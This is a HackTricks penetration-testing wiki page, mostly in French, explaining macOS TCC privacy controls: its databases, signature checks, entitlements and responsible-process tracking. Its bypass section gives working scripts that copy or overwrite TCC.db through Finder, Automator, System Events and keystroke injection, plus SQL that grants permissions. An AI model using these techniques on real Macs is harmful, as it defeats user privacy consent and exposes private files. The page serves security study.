# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Informations de base**

**TCC (Transparency, Consent, and Control)** est un protocole de sécurité qui se concentre sur la régulation des permissions des applications. Son rôle principal est de protéger les fonctionnalités sensibles telles que **les services de localisation, les contacts, les photos, le microphone, la caméra, l’accessibilité et l’accès complet au disque**. En exigeant le consentement explicite de l’utilisateur avant d’autoriser l’accès d’une application à ces éléments, TCC renforce la confidentialité et le contrôle des utilisateurs sur leurs données.

Les utilisateurs rencontrent TCC lorsque des applications demandent l’accès à des fonctionnalités protégées. Cela est visible via une invite qui permet aux utilisateurs **d’autoriser ou de refuser l’accès**. De plus, TCC prend en charge les actions directes de l’utilisateur, telles que **faire glisser et déposer des fichiers dans une application**, afin d’accorder l’accès à des fichiers spécifiques et de garantir que les applications n’accèdent qu’aux éléments explicitement autorisés.

![Un exemple d’invite TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** est géré par le **daemon** situé dans `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` et configuré dans `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (enregistrant le service mach `com.apple.tccd.system`).

Un **tccd en mode utilisateur** s’exécute pour chaque utilisateur connecté, défini dans `/System/Library/LaunchAgents/com.apple.tccd.plist`, et enregistre les services mach `com.apple.tccd` et `com.apple.usernotifications.delegate.com.apple.tccd`.

Ici, vous pouvez voir le tccd s’exécutant en tant que système et en tant qu’utilisateur :
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Les **permissions** sont **héritées de l’application parente** et les **permissions** sont **suivies** en fonction du **Bundle ID** et du **Developer ID**.

### Bases de données TCC

Les autorisations/refus sont ensuite stockés dans certaines bases de données TCC :

- La base de données globale du système dans **`/Library/Application Support/com.apple.TCC/TCC.db`** .
- Cette base de données est **protégée par SIP**, donc seul un contournement de SIP peut y écrire.
- La base de données TCC de l’utilisateur **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** pour les préférences propres à chaque utilisateur.
- Cette base de données est protégée, de sorte que seuls les processus disposant de privilèges TCC élevés, comme Full Disk Access, peuvent y écrire (mais elle n’est pas protégée par SIP).

> [!WARNING]
> Les bases de données précédentes sont également **protégées par TCC pour l’accès en lecture**. Vous **ne pourrez donc pas lire** votre base de données TCC utilisateur normale, sauf depuis un processus privilégié par TCC.
>
> Cependant, rappelez-vous qu’un processus disposant de ces privilèges élevés (comme **FDA** ou **`kTCCServiceEndpointSecurityClient`**) pourra écrire dans la base de données TCC des utilisateurs.

- Il existe une **troisième** base de données TCC dans **`/var/db/locationd/clients.plist`**, qui indique les clients autorisés à **accéder aux services de localisation**.
- Le fichier protégé par SIP **`/Users/carlospolop/Downloads/REG.db`** (également protégé contre l’accès en lecture par TCC) contient l’**emplacement** de toutes les **bases de données TCC valides**.
- Le fichier protégé par SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (également protégé contre l’accès en lecture par TCC) contient davantage de permissions TCC accordées.
- Le fichier protégé par SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (mais lisible par n’importe qui) est une liste d’autorisation des applications nécessitant une exception TCC.

> [!TIP]
> La base de données TCC dans **iOS** se trouve dans **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> L’**interface utilisateur du centre de notifications** peut apporter des **modifications à la base de données TCC du système** :
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Cependant, les utilisateurs peuvent **supprimer ou interroger des règles** avec l’utilitaire en ligne de commande **`tccutil`**.

#### Interroger les bases de données

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> En vérifiant les deux bases de données, vous pouvez vérifier les permissions qu'une application a autorisées, interdites ou qu'elle ne possède pas (elle les demandera).

- Le **`service`** est la représentation sous forme de chaîne de la **permission** TCC
- Le **`client`** est l'**ID de bundle** ou le **chemin vers le binaire** disposant des permissions
- Le **`client_type`** indique s'il s'agit d'un Bundle Identifier(0) ou d'un chemin absolu(1)

<details>

<summary>Comment l'exécuter s'il s'agit d'un chemin absolu</summary>

Exécutez simplement **`launctl load you_bin.plist`**, avec un plist tel que :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- La valeur **`auth_value`** peut prendre différentes valeurs : denied(0), unknown(1), allowed(2) ou limited(3).
- La valeur **`auth_reason`** peut prendre les valeurs suivantes : Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Le champ **`csreq`** indique comment vérifier le binaire à exécuter et lui accorder les permissions TCC :
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Pour plus d’informations sur les **autres champs** du tableau, [**consultez cet article de blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Vous pouvez également consulter les **autorisations déjà accordées** aux applications dans `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Les utilisateurs _peuvent_ **supprimer ou interroger les règles** à l’aide de **`tccutil`**.

#### Réinitialiser les autorisations TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC Signature Checks

La **base de données** TCC stocke le **Bundle ID** de l’application, mais elle stocke également des **informations** sur la **signature** afin de **s’assurer** que l’application demandant l’utilisation d’une permission est bien la bonne.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Par conséquent, les autres applications utilisant le même nom et le même bundle ID ne pourront pas accéder aux permissions accordées aux autres applications.

### Entitlements & TCC Permissions

Les applications **ne doivent pas seulement** **demander un accès** à certaines ressources et **se le voir accorder** ; elles doivent également **posséder les entitlements correspondants**.\
Par exemple, **Telegram** possède l’entitlement `com.apple.security.device.camera` pour demander **l’accès à la caméra**. Une **application** qui ne possède pas cet **entitlement** **ne pourra pas** accéder à la caméra (et l’utilisateur ne sera même pas invité à accorder les permissions).

Notez que les entitlements sont des fichiers plist et font partie de la code sig ; ils sont ensuite hachés dans la code sig via des slots spéciaux et peuvent être interrogés dans le kernel par du code du kernel ou par du code du modèle utilisateur à l’aide de `csops(#169)` ou `csops_audittoken(#170)`.

Cependant, pour que les applications puissent **accéder** à **certains dossiers utilisateur**, tels que `~/Desktop`, `~/Downloads` et `~/Documents`, elles **n’ont besoin d’aucun entitlement spécifique.** Le système gère l’accès de manière transparente et **demande confirmation à l’utilisateur** si nécessaire.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Les applications d’Apple **ne génèrent pas de prompts**. Elles contiennent des **droits préaccordés** dans leur liste d’**entitlements**, ce qui signifie qu’elles **n’afficheront jamais de popup** et **n’apparaîtront pas non plus dans les bases de données TCC.** Par exemple :
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Cela empêchera Calendar de demander à l'utilisateur l'accès aux rappels, au calendrier et au carnet d'adresses.

> [!TIP]
> Outre certaines documentations officielles sur les entitlements, il est également possible de trouver des **informations intéressantes non officielles sur les entitlements dans** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Certaines permissions TCC sont : kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Il n'existe aucune liste publique qui les définisse toutes, mais vous pouvez consulter cette [**liste des permissions connues**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Emplacements sensibles non protégés

- $HOME (lui-même)
- $HOME/.ssh, $HOME/.aws, etc.
- /tmp

### User Intent / com.apple.macl

Comme indiqué précédemment, il est possible **d'accorder à une App l'accès à un fichier en le faisant glisser-déposer dessus**. Cet accès ne sera spécifié dans aucune base de données TCC, mais en tant qu'**attribut** **étendu du fichier**. Cet attribut **stockera l'UUID** de l'app autorisée :<sup>[[2]](#references)</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> Il est curieux que l’attribut **`com.apple.macl`** soit géré par le **Sandbox**, et non par tccd.
>
> Notez également que si vous déplacez vers un autre ordinateur un fichier qui autorise l’UUID d’une app sur votre ordinateur, comme la même app aura des UID différents, cela n’accordera pas l’accès à cette app.

L’attribut étendu `com.apple.macl` **ne peut pas être effacé** comme les autres attributs étendus, car il est **protégé par SIP**. Toutefois, comme [**expliqué dans cet article**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), il est possible de le désactiver en **zippant** le fichier, en le **supprimant**, puis en le **décompressant**.<sup>[[3]](#references)</sup>






## Mécanisme Responsible Process de XNU

Dans macOS/iOS, le mécanisme **responsible process** est une fonctionnalité de sécurité essentielle utilisée par le framework **TCC (Transparency, Consent, and Control)** ainsi que par d’autres systèmes de sécurité pour suivre le processus finalement responsable d’une action, y compris à travers des chaînes de processus enfants.

Lorsque TCC vérifie les permissions (par exemple, la caméra, le microphone ou la localisation), il ne vérifie pas toujours le processus immédiat qui effectue la requête. Il vérifie plutôt le **responsible process** - généralement l’application GUI qui a initié l’action, même si la requête réelle provient d’un processus auxiliaire ou d’un daemon.

<details>
<summary>Comment le Responsible Process est défini</summary>

### Champs de structure des processus

Chaque processus dans XNU conserve deux identifiants UUID essentiels :
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`** : UUID propre au processus (provenant de la commande de chargement `LC_UUID` de son binaire Mach-O)
- **`p_responsible_pid`** : PID du processus responsable
- **`p_responsible_uuid`** : UUID du processus responsable (persiste même après l'arrêt de ce processus)

### Définition du processus responsable

1. **Lors de la création du processus (Fork)**

Lorsqu'un nouveau processus est créé via `fork()` ou `posix_spawn()`, le processus responsable est hérité du parent (l'appel système `exec()` réutilise la structure `proc` existante ; cette étape n'est donc pas répétée à ce moment-là) :

**Emplacement** : `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**Points clés :**
- Les processus enfants **héritent** du `p_responsible_pid` du parent
- Cela crée une **chaîne de responsabilité** à travers la hiérarchie des processus
- Le processus responsable pointe généralement vers l’application GUI d’origine

2. **La fonction principale : `proc_set_responsible_pid()`**

**Emplacement** : `bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**Ce que fait cette fonction :**
1. **Définit le PID responsable** dans le processus cible
2. **Recherche le processus responsable** à l’aide de `proc_find()` (incrémente le compteur de références)
3. **Copie l’UUID** du processus responsable, de `p_uuid` vers `p_responsible_uuid` du processus cible
4. **Libère la référence** avec `proc_rele()` (décrémente le compteur de références)

3. **Pourquoi stocker à la fois le PID et l’UUID ?**

L’approche de double stockage résout un problème critique :

| Champ | Rôle | Problème | Solution |
|-------|---------|---------|----------|
| `p_responsible_pid` | Recherche rapide du processus actuel | Le PID peut être réutilisé après l’arrêt du processus | Utilisé pour rechercher un processus actif |
| `p_responsible_uuid` | Identification persistante | Persiste après l’arrêt du processus | Utilisé pour les contrôles de sécurité et l’audit |

**Le problème** : si le processus responsable s’arrête avant le processus enfant, le PID peut être recyclé et attribué à un processus complètement différent.

**La solution** : l’UUID est immuable et identifie de manière unique le binaire spécifique qui était responsable, même après son arrêt.

### Flux de création du processus
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### Source de l'UUID : Load Command LC_UUID

L'UUID stocké dans `p_uuid` provient du **load command `LC_UUID` de l'exécutable Mach-O** :

1. **Temps de compilation**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **Temps d'exécution**

**Emplacement** : `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **Stocké dans la structure du processus**

**Emplacement** : `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**Emplacement**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### Insérer dans TCC

Si, à un moment donné, vous parvenez à obtenir un accès en écriture à une base de données TCC, vous pouvez utiliser quelque chose comme ce qui suit pour ajouter une entrée (supprimez les commentaires) :

<details>

<summary>Exemple d’insertion dans TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

If you managed to get inside an app with some TCC permissions check the following page with TCC payloads to abuse them:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Learn about Apple Events in:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

The TCC name of the Automation permission is: **`kTCCServiceAppleEvents`**\
This specific TCC permission also indicates the **application that can be managed** inside the TCC database (so the permissions doesn't allow just to manage everything).

**Finder** is an application that **always has FDA** (even if it doesn't appear in the UI), so if you have **Automation** privileges over it, you can abuse its privileges to **make it do some actions**.\
In this case your app would need the permission **`kTCCServiceAppleEvents`** over **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Vous pourriez exploiter cela pour **écrire votre propre base de données TCC utilisateur**.

> [!WARNING]
> Avec cette permission, vous pourrez **demander à Finder d'accéder aux dossiers restreints par TCC** et lui faire transmettre les fichiers, mais à ma connaissance, vous **ne pourrez pas faire exécuter du code arbitraire à Finder** afin d'exploiter pleinement son accès FDA.
>
> Par conséquent, vous ne pourrez pas exploiter toutes les capacités de FDA.

Voici l'invite TCC permettant d'obtenir les privilèges d'Automation sur Finder :

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Notez que, comme l'application **Automator** possède la permission TCC **`kTCCServiceAppleEvents`**, elle peut **contrôler n'importe quelle application**, comme Finder. Ainsi, en ayant la permission de contrôler Automator, vous pourriez également contrôler **Finder** avec un code comme celui ci-dessous :

<details>

<summary>Obtenir un shell dans Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

La même chose se produit avec l’application **Script Editor,** qui peut contrôler Finder, mais un AppleScript ne permet pas de la forcer à exécuter un script.

### Automation (SE) vers certains TCC

**System Events peut créer des Folder Actions, et les Folder Actions peuvent accéder à certains dossiers TCC** (Desktop, Documents & Downloads), de sorte qu’un script comme le suivant peut être utilisé pour exploiter ce comportement :
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** vers FDA\*

Automation sur **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) permet d’envoyer des **keystrokes aux processus**. Ainsi, vous pourriez exploiter Finder pour modifier le TCC.db des utilisateurs ou accorder FDA à une application arbitraire (bien qu’un mot de passe puisse être demandé dans ce cas).

Exemple de réécriture du TCC.db des utilisateurs avec Finder :
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` vers FDA\*

Consultez cette page pour trouver des [**payloads permettant d'abuser des permissions Accessibility**](macos-tcc-payloads.md#accessibility) afin d'effectuer une privesc vers FDA\* ou d'exécuter un keylogger, par exemple.

### **Endpoint Security Client vers FDA**

Si vous disposez de **`kTCCServiceEndpointSecurityClient`**, vous avez FDA. Fin.

### System Policy SysAdmin File vers FDA

**`kTCCServiceSystemPolicySysAdminFiles`** permet de **modifier** l'attribut **`NFSHomeDirectory`** d'un utilisateur, ce qui modifie son dossier personnel et permet donc de **bypasser TCC**.<sup>[[5]](#references)</sup>

### User TCC DB vers FDA

L'obtention des **permissions d'écriture** sur la base de données **TCC utilisateur** ne vous permet **pas** de vous accorder les permissions **`FDA`** ; seule la base de données système peut les accorder.

Mais vous pouvez vous accorder les **droits d'Automation sur Finder**, puis exploiter la technique précédente pour effectuer une privesc vers FDA\*.

### **FDA vers les permissions TCC**

Le nom TCC de **Full Disk Access** est **`kTCCServiceSystemPolicyAllFiles`**.

Je ne pense pas qu'il s'agisse d'une véritable privesc, mais au cas où cela vous serait utile : si vous contrôlez un programme disposant de FDA, vous pouvez **modifier la base de données TCC des utilisateurs et vous accorder n'importe quel accès**. Cela peut être utile comme technique de persistence si vous risquez de perdre vos permissions FDA.

### **SIP Bypass vers TCC Bypass**

La **base de données TCC** système est protégée par **SIP**, c'est pourquoi seuls les processus disposant des **entitlements indiqués pourront la modifier**. Par conséquent, si un attaquant trouve un **SIP bypass** sur un **fichier** (c'est-à-dire s'il peut modifier un fichier restreint par SIP), il pourra :

- **Supprimer la protection** d'une base de données TCC et s'accorder toutes les permissions TCC. Il pourrait par exemple exploiter l'un des fichiers suivants :
- La base de données TCC système
- REG.db
- MDMOverrides.plist

Cependant, il existe une autre option pour exploiter ce **SIP bypass afin de bypasser TCC** : le fichier `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` est une allow list des applications nécessitant une exception TCC. Par conséquent, si un attaquant peut **supprimer la protection SIP** de ce fichier et y ajouter sa **propre application**, celle-ci pourra bypasser TCC.\
Par exemple, pour ajouter Terminal :
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Bypasses


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## References

- [1] [Analyse approfondie de macOS TCC.db - Blog de Rainforest QA](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - script pour suivre com.apple.macl (Gist de brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Suivre et gérer com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Contourner les protections de confidentialité des utilisateurs de macOS TCC par accident et intentionnellement](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Modifier le répertoire home et contourner TCC, également connu sous le nom de CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
{{#include ../../../../banners/hacktricks-training.md}}
